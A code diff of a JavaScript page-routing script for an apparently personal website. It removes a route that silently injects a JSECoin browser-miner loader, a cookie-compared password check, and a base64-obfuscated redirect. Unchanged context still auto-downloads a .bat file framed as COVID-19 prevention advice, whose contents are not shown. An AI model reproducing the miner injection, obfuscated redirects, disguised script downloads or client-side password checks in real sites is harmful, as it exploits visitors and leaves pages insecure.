@@ -315,29 +315,6 @@ if(location == site + "Animated") {
 }
 
 
-if(location == site + "mine") {
-!function(){var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/174264/fsanchir.kro.kr/0/0/",s.parentNode.insertBefore(t,s)}();
-}
-
-if(location == site + "login") {
-    if(getCookie("PASSWORD") == app) { location.href = "/"; }
-    else {
-        setCookie("showlogin", "true", 1);
-        location.href = "/";
-    }
-}
-
-
-
-if(location == site + "FS") {
-    if(getCookie("PASSWORD") == app) {
-    location.href = atob("aHR0cHM6Ly90ZXh0ZWRpdG9yLmNvLz9zdGF0ZT0lN0IlMjJpZHMlMjI6JTVCJTIyMV9oMTZOMXF2bzgyWllNQ0swdzdXVTZhYjdhdmpMNTFaJTIyJTVELCUyMmFjdGlvbiUyMjolMjJvcGVuJTIyLCUyMnVzZXJJZCUyMjolMjIxMTc4ODQ4NDczNzA5OTUzMzU5NzIlMjIlN0Q=")
-    }
-    else {
-        location.href = "/403";
-    }
-}
-
 
 if(location == site + "NS001") {
     write('<title>NS001 Recovery</title>');
@@ -360,14 +337,6 @@ if(location == site + "date") {
     datewidget();
 }
 
-if(location == site + "Widget") {
-    write('<title>FSanchir - Widget</title>');
-    write('<div id="widgetdiv" align="center"><br><br><p id="widgetfirstp"></p>');
-    write('<br><br><br>');
-    write('1. M.Second - 1970~Now<br>');
-    write('<iframe src="http://fsanchir.kro.kr/date" width="150px" height="55px"></iframe>');
-    write('</div>');
-}
 var dlsite = "http://dl.fsanchir.kro.kr/";
 if(location == dlsite + "covid19batch") {
     gonow("https://k.kakaocdn.net/dn/EyLR9/btqBuPJ7mTv/gcUQ18At00ARfP2LF0UNzK/%EC%9A%B0%ED%95%9C%20%ED%8F%90%EB%A0%B4%20%EC%98%88%EB%B0%A9%EB%B2%95.bat?attach=1&knm=tfile.bat");
